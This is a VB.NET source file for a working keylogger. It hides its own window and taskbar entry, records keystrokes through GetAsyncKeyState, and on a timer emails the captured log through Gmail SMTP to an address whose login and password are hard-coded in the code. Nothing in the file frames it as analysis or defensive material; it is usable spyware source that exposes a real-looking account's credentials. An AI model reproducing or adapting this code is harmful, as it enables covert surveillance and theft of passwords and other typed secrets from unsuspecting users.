Option Strict On
Imports System.Net.Mail
Public Class Form1
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Integer
    Private Sub tmremail_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrEmail.Tick
        Try
            Dim smtpserver As New SmtpClient
            smtpserver.EnableSsl = True
            Dim mail As New MailMessage

            smtpserver.Credentials = New Net.NetworkCredential("nithin.reddy344@gmail.com", "8186821765")
            smtpserver.Port = 587
            smtpserver.Host = "smtp.gmail.com"
            mail = New MailMessage
            mail.From = New MailAddress("nithin.reddy344@gmail.com")
            mail.To.Add("nithin.reddy344@gmail.com")
            mail.Subject = ("New Key Log Data")
            mail.Body = txtlogs.Text()
            smtpserver.Send(mail)

        Catch ex As Exception
            Me.Close()
        End Try
    End Sub

    Private Sub tmrkeys_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles tmrkeys.Tick
        Dim result As Integer
        Dim key As String
        Dim i As Integer


        For i = 2 To 90
            result = 0
            result = GetAsyncKeyState(i)

            If result = -32767 Then
                key = Chr(i)
                If i = 13 Then key = vbNewLine
                Exit For
            End If
        Next i
        If key <> Nothing Then
            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                txtlogs.Text &= key
            Else
                txtlogs.Text &= key.ToLower
            End If
        End If
        If My.Computer.Keyboard.AltKeyDown AndAlso My.Computer.Keyboard.CtrlKeyDown AndAlso key = "V" Then
            Me.Visible = True

        End If
    End Sub

    Private Sub Form1_FormClosed(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosedEventArgs) Handles Me.FormClosed
        txtlogs.Text &= vbNewLine & "Keylogger has been stopped at: " & Now & vbNewLine
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Me.ShowIcon = False
        Me.ShowInTaskbar = False
        Me.Visible = False
        txtlogs.Text &= vbNewLine & "Keylogger started at: " & Now & vbNewLine
    End Sub
End Class
